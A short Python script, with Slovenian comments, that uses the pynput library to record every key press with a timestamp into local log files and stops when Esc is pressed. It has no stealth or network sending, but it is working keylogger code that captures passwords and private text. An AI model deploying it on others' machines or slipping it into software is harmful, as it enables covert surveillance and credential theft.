from pynput import keyboard
import logging
from datetime import datetime
import os

# Ustvari mapo za loge, če še ne obstaja
os.makedirs("logs", exist_ok=True)

# Ustvari unikatno ime datoteke
log_filename = f"logs/key_log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Globalna spremenljivka za listener
listener = None

def on_press(key):
    try:
        if hasattr(key, 'char'):
            logging.info(f"Key pressed: {key.char}")
        else:
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error on key press: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_logging():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

def stop_logging():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
